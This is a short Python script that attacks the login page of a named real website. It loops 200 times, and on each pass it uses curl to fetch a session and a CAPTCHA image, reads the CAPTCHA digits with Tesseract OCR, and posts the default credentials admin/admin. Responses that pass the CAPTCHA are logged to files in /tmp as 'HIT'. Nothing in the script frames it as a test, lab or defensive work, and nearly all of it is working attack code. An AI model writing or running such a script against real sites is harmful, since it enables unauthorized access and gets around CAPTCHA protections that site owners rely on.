import subprocess, re, time
URL='http://www.taiso.com.cn'
C='/tmp/tso.txt'
for i in range(200):
    try:
        subprocess.run(['curl','-sk','--connect-timeout','5',f'{URL}/login.php','-c',C,'-b',C,'-o','/dev/null'],timeout=8)
        subprocess.run(['curl','-sk','--connect-timeout','5',f'{URL}/data/include/imagecode.php?act=verifycode','-b',C,'-o','/tmp/tso.png'],timeout=8)
        subprocess.run(['tesseract','/tmp/tso.png','/tmp/tso_ocr','-c','tessedit_char_whitelist=0123456789','--psm','7'],timeout=5)
        try: code=open('/tmp/tso_ocr.txt').read().strip().replace(' ','')[:5]
        except: code='0000'
        r=subprocess.run(['curl','-sk','--connect-timeout','5','-L',f'{URL}/login.php','-X','POST','-d',f'act=login&username=admin&password=admin&valicode={code}&login_btn=login','-b',C],capture_output=True,text=True,timeout=8)
        result='WRONG'
        if '验证码错误' not in r.stdout and '验证码格式' not in r.stdout and len(r.stdout)>80:
            result=f'HIT:{r.stdout[:200]}'
            open('/tmp/TSO_HIT.txt','w').write(f'code={code}\n{r.stdout[:500]}')
        open('/tmp/tso_result.txt','a').write(f'{i}:OCR={code} {result}\n')
    except: pass
    time.sleep(0.5)
    if i%20==0: print(f'[{i}/200]')
print('DONE')
